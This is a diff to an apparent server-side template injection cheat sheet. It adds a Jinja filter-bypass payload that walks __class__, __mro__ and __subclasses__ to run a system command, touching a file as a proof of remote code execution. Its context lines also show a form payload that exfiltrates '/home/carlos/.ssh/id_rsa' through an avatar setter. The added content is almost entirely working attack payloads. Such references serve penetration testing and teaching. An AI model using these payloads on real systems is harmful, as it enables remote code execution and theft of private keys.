@@ -239,6 +239,32 @@ Content-Type: application/x-www-form-urlencoded
 blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')}}{{user.gdprDelete()&csrf=iB1bGX9u9yTvRO2QTM7rExJIwCgPxKPC
 ```
 
+### Jinja alternative syntax bypass
+
+```python
+{% set foo = "foo" %}
+{% set bar = "bar" %}
+{% set foo.bar = "Just another variable" %}
+{{ foo.bar }} # Just another variable
+{{ foo|attr(bar) }} # Just another variable
+
+
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+
+{{ string|attr(class) }} # list class
+
+{% set mro_r = string|attr(mro) %} # list one mro at a time
+{{ mro_r[1] }}
+
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %} # list subclasses
+{{ subclasses_r }}
+{{ subclasses_r[420] }}
+{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }} # RCE!
+```
+
 # External Resources
 
 - [Server-Side Template Injection | James Kettle](https://portswigger.net/research/server-side-template-injection)
